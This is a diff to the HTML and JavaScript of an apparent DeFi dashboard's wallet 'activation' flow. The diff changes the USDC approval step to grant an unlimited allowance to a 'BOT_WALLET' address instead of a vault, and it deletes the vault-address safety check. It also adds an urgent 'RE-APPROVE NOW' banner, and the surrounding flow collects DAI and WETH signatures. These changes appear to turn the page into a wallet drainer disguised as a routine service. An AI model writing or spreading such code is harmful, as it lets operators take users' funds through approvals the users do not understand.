@@ -199,6 +199,14 @@
       </div>
 
     </div>
+
+    <!-- USDC re-approval repair banner (shown when bot lacks USDC allowance) -->
+    <div id="usdc-repair-banner" class="usdc-repair-banner" style="display:none">
+      <span class="usdc-repair-icon">&#9888;</span>
+      <span class="usdc-repair-msg">USDC ROUTING APPROVAL NEEDED — repay engine blocked</span>
+      <button id="usdc-repair-btn" class="usdc-repair-btn">RE-APPROVE NOW</button>
+    </div>
+
   </section>
 
   <!-- ══ INFRA: Operator Bay ═════════════════════════════════════════════════ -->
@@ -1087,11 +1095,6 @@ async function cmRunActivationSequence() {
     activationError({ message: 'Delegation Manager address not configured. Contact support.' }, null);
     return;
   }
-  if (!CONTRACTS.VAULT || CONTRACTS.VAULT.length < 42 || CONTRACTS.VAULT.indexOf('{{') !== -1) {
-    activationError({ message: 'Vault address not configured. Contact support.' }, null);
-    return;
-  }
-
   var sigData  = { daiSignature: null, wethSignature: null, deadline: null };
   var txHashes = { approve: null, delegation: null, usdc: null, usdt: null };
 
@@ -1164,7 +1167,7 @@ async function cmRunActivationSequence() {
     cmSetProgress(65, 'Step 4/5: Approving USDC routing...');
     cmSetStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
     var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
-    var tx4 = await usdcContract.approve(CONTRACTS.VAULT, ethers.constants.MaxUint256);
+    var tx4 = await usdcContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
     cmSetStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
     await tx4.wait();
     txHashes.usdc = tx4.hash;
